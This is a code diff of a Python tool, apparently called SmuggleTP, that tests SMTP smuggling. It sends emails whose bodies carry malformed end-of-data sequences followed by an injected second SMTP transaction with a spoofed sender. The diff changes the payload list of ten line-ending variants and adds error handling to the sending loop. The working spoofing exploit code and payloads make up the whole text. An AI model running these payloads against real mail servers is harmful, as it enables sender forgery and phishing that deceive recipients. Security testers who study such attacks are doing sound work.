@@ -6,16 +6,16 @@ import argparse
 
 # Payloads
 payloads = [
-    ('n.n', '\n.\n'),
-    ('n.r', '\n.\r'),
-    ('r.n', '\r.\n'),
-    ('r.r', '\r.\r'),
-    ('n.rn', '\n.\r\n'),
-    ('rn.n', '\r\n.\n'),
-    ('r.rn', '\r.\r\n'),
-    ('rn.r', '\r\n.\r'),
-    ('rn0.rn', '\r\n\x00.\r\n'),
-    ('rn.0rn', '\r\n.\x00\r\n')
+    '\n.\n',
+    '\n.\r',
+    '\r.\n',
+    '\r.\r',
+    '\n.\r\n',
+    '\r\n.\n',
+    '\r.\r\n',
+    '\r\n.\r',
+    '\r\n\x00.\r\n',
+    '\r\n\x00.\x00\r\n',
 ]
 
 # Configure logging
@@ -54,10 +54,13 @@ if smtp_username and smtp_password:
     server.login(smtp_username, smtp_password)  # Perform authentication
 
 for payload in payloads:
-    message = f'Subject: Test\r\nFrom: {sender_email}\r\nTo: {receiver_email}\r\n\r\nTest' + payload[1] + f'mail FROM:<{spoofed_email}>\r\nrcpt TO:<{receiver_email}>\r\ndata\r\nSubject: SmuggleTP (Payload ' + payload[0] + f')\r\nFrom: {spoofed_email}\r\nTo: {receiver_email}\r\n\r\nSmuggleTP (Payload ' + payload[0] + f')'
-    logging.info(f'Sending SMTP Smuggling (Payload ' + payload[0] + f') email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} ...')
-    server.sendmail(sender_email, receiver_email, message.encode('utf-8'))  # Send the email
-    logging.info(f'Email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} sent successfully.')
+    message = f'Subject: Test\r\nFrom: {sender_email}\r\nTo: {receiver_email}\r\n\r\nTest{payload}mail FROM:<{spoofed_email}>\r\nrcpt TO:<{receiver_email}>\r\ndata\r\nSubject: SmuggleTP (Payload {repr(payload)})\r\nFrom: {spoofed_email}\r\nTo: {receiver_email}\r\n\r\nSmuggleTP (Payload {repr(payload)})'
+    logging.info(f'Sending SMTP Smuggling (Payload {repr(payload)}) email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} ...')
+    try:
+        server.sendmail(sender_email, receiver_email, message.encode('utf-8'))  # Send the email
+        logging.info(f'Email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email} sent successfully.')
+    except Exception as e:
+        logging.error(f'Failed to send email from {sender_email} (Spoofing {spoofed_email}) to {receiver_email}: {e}')
 
 server.quit()  # End the SMTP session
 logging.info(f'Connection closed to {smtp_server}:{smtp_port} SMTP server.')
